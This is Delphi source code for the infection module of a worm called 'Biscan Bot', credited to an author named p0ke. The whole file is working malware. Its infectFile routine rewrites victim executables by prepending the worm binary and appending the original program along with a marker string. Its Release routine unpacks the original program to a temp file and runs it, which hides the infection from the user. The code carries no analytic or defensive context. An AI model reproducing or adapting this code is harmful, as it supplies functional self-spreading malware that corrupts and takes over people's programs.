(* Biscan Bot: Coded by p0ke *)
{ -- http://p0ke.no-ip.com -- }

unit pInfect;

interface

Uses
  Windows, pBot, pFunc;

type
  TAttachmentHeader = record
    MagicNumber: cardinal;
    CRC: cardinal;
    Size: int64;
    IsStub: boolean;
    FileName: array[0..MAX_PATH] of char;
  end;
  PAttachmentHeader = ^TAttachmentHeader;

var
  Virus  : tHandle;
  OutPut : tHandle;
  Header : tAttachmentHeader;
  itemHeader : pAttachmentHeader;

  fName  : String;
  StubSize : int64;

  Procedure Release;
  Procedure infectFile(Victime:String);

implementation

function SpawnProgram(Filename: string): boolean;
var
  si: TStartupInfo;
  pi: TProcessInformation;
begin
  FillChar(si, sizeof(si), 0);
  si.cb:= sizeof(si);
  si.dwFlags:= STARTF_USESHOWWINDOW;
  si.wShowWindow:= SW_SHOWDEFAULT;
  if not CreateProcessA(nil, PChar(Filename), nil, nil, false, 0, nil, nil, si, pi) then
  begin
    result:= false;
    Exit;
    Halt(0);
  end
  else
    result:= true;
end;

function GetTmpPath: string;Begin Result := TmpDir(''); End;

function FileExists(const FileName: string): Boolean;
var
lpFindFileData: TWin32FindData;
hFile: Cardinal;
begin
  hFile := FindFirstFile(PChar(FileName), lpFindFileData);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    result := True;
    Windows.FindClose(hFile)
  end
  else
    result := False;
end;

function FileOpen(const FileName: string; Mode: LongWord): Integer;
const
  AccessMode: array[0..2] of LongWord = (
  GENERIC_READ,
  GENERIC_WRITE,
  GENERIC_READ or GENERIC_WRITE);
  ShareMode: array[0..4] of LongWord = (
  0,
  0,
  FILE_SHARE_READ,
  FILE_SHARE_WRITE,
  FILE_SHARE_READ or FILE_SHARE_WRITE);
begin
  Result := Integer(CreateFileA(PChar(FileName), AccessMode[Mode and 3],
  ShareMode[(Mode and $F0) shr 4], nil, OPEN_EXISTING,
  FILE_ATTRIBUTE_NORMAL, 0));
end;

function FileCreate(const FileName: string): Integer;
begin
  Result := Integer(CreateFileA(PChar(FileName), GENERIC_READ or GENERIC_WRITE,
  0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0));
end;

procedure FileClose(Handle: Integer);
begin
  CloseHandle(THandle(Handle));
end;

Procedure Release;
var
  buffer: array[0..$ffff] of byte;
  fSource, fTemp: THandle;
  BytesRead, BytesWritten: cardinal;
  NeededSize, BufferRead: cardinal;
  tmppath, fname, tname: string;
  Header: TAttachmentHeader;
begin
  TmpPath := GetTmpPath;
  Try
    FSource := FileOpen(ParamStr(0), fmOpenRead or fmShareDenyWrite);
    If FSource = THandle(-1) Then
    Begin
      Exit;
    End;
    Try
      SetFilePointer(FSource, GetFileSize(FSource, NIL) - SizeOf(TAttachmentHeader), NIL, FILE_BEGIN);
      ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
      if (Header.MagicNumber <> $FEEDBEEF) or (BytesRead <> SizeOf(Header)) Then
      Begin
        FileClose(FSource);
        Exit;
      End;
      SetFilePointer(FSource, Header.Size, NIL, FILE_BEGIN);
      While (SetFilePointer(FSource, 0, NIL, FILE_CURRENT) <= (GetFileSize(FSource, NIL) - SizeOf(Header))) Do
      Begin
        ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
        If Header.MagicNumber <> $FEEDBEEF Then
        Begin
          Exit;
        End;
        FName := Header.FileName;
        Repeat
          Str(GetTickCount, TName);
          Fname := 'tmp'+tname+'.exe';
          Sleep(0);
        Until Not FileExists(TmpPath+Fname);
        fTemp := FileCreate(TmpPath + Fname);
        NeededSize := Header.Size;
        Repeat
          If NeededSize > SizeOf(Buffer) Then
            BufferRead := SizeOf(Buffer)
          Else
            BufferRead := NeededSize;
          ReadFile(FSource, Buffer, BufferRead, BytesRead, NIL);
          WriteFile(FTemp, Buffer, BytesRead, BytesWritten, NIL);
          Dec(NeededSize, BytesRead);
        Until (BytesRead <> BufferRead) Or (NeededSize = 0);
        FileClose(FTemp);
        If (NeededSize <> 0) Or (Not SpawnProgram(TmpPath + Fname)) Then
        Begin
          FileClose(FSource);
          Exit;
        End;
      End;
      FileClose(FSource);
      Finally
        End;
    Finally
      End;
End;

Function FFileSize(FileName: String): int64;
Var
  H: tHandle;
  fData: tWin32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), fData);
  If H <> INVALID_HANDLE_VALUE Then
  Begin
    Windows.FindCLose(H);
    Result := Int64(fData.nFileSizeHigh) shl 32 +
    fData.nFileSizeLow;
  End;
End;

Function GetHeader(FileW: String): pAttachmentHeader;
Var
  Header: pAttachmentHeader;
Begin
  Header := AllocMem(SizeOf(tAttachmentHeader));
  StrLCopy(@Header.Filename, pChar(FileW), MAX_PATH);
  Header.Size := FFileSize(FileW);
  Header.IsStub := False;
  Result := Header;
End;

Procedure infectFile(Victime:String);
Var
  Buffer: Array[0..2048] Of Char;
  BytesRead, BytesWritten: LongWord;
  F:File;
  Str:String;
  I:Integer;
Begin
  {$i-}
   AssignFile(F, Victime);
   FileMode:=0;
   Reset(F, 1);
   I := FileSize(F);
   SetLength(Str,FileSize(F));
   BlockRead(F, Str[1], I);
   CloseFile(F);
  {$i+}
  If Pos('biscanwormmark',Str)>0 Then Exit;
  ZeroMemory(@Buffer, SizeOf(Buffer));
  OutPut := CreateFile(pChar(Victime+'-'),
            GENERIC_WRITE,
            FILE_SHARE_WRITE,
            NIL,
            CREATE_NEW,
            FILE_ATTRIBUTE_NORMAL,
            0);
  itemHeader := GetHeader(ParamStr(0));
  fName      := StrPas(@itemHeader.FileName);
  Virus  := CreateFile(pChar(fName),
            GENERIC_READ,
            FILE_SHARE_READ,
            NIL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0);
  Repeat
    ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
    WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
  Until BytesWritten = 0;
  CloseHandle(Virus);
  itemHeader := GetHeader(Victime);
  fName      := StrPas(@itemHeader.FileName);
  Header.MagicNumber := $FEEDBEEF;
  Header.CRC := 0;
  Header.Size := FFileSize(Victime);
  Header.IsStub := False;
  Header.FileName := itemHeader.FileName;
  WriteFile(OutPut, Header, SizeOf(Header), BytesWritten, NIL);
  Virus  := CreateFile(pChar(fName),
            GENERIC_READ,
            FILE_SHARE_READ,
            NIL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0);
  Repeat
    ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
    WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
  Until BytesWritten = 0;
  CloseHandle(Virus);

  itemHeader := GetHeader(ParamStr(0));
  fName := StrPas(@itemHeader.FileName);
  StubSize := FFileSize(ParamStr(0));

  Header.MagicNumber := $FEEDBEEF;
  Header.CRC := 0;
  Header.Size := StubSize;
  Header.IsStub := True;

  FillChar(Header.FileName, MAX_PATH+1, 0);

  WriteFile(OutPut, Header, SizeOf(Header), BytesWritten, NIL);
  Str := 'biscanwormmark';
  WriteFile(OutPut, Str[1], Length(Str), BytesWritten, NIL);
  CloseHandle(OutPut);

  DeleteFile(pChar(Victime));
  CopyFile  (pChar(Victime+'-'), pChar(Victime), False);
  DeleteFile(pChar(Victime+'-'));

  inc(scan_infectedfiles);
End;



end.
